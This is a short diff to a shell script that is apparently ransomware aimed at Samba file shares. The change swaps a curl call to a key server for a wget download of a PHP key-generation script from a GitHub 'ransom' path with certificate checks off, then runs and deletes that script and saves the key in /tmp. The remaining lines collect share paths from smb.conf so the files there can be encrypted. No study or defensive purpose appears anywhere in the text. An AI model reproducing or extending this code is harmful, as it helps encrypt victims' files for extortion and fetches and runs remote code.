@@ -12,9 +12,16 @@ targetFolder="/shares"
 # Samba folders only. Set to False to target only $targetFolder
 smb="True"
 
-# Encrypt files
+# Get AES encryption key
+wget 'https://raw.githubusercontent.com/absane/Tricks/master/ransom/key.php' -O /tmp/key.php --no-check-certificate
 . /tmp/dynamicconfig.ini
-KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
+KEY=$(php /tmp/key.php $DEVICEID)
+DEVICEID=''
+rm /tmp/key.php
+
+echo $KEY > /tmp/thekey
+
+# Encrypt files
 if [ $smb == "True" ]
 then
 	for i in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
